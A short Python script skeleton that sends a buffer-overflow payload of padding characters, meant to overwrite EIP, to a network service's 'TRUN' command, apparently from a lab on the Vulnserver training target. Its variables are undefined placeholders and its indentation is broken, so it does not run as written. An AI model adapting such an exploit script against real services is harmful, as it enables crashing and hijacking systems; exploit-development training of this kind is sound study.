#!/usr/bin/python

import sys,socket

shellcode = "A" * offset_found + "B" * EIP_length

 try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect(('IP',port))
                            s.send (('TRUN /.:/' + shellcode))
                            s.close()
              
except:
                            print "Error connecting to server"
                            sys.exit()
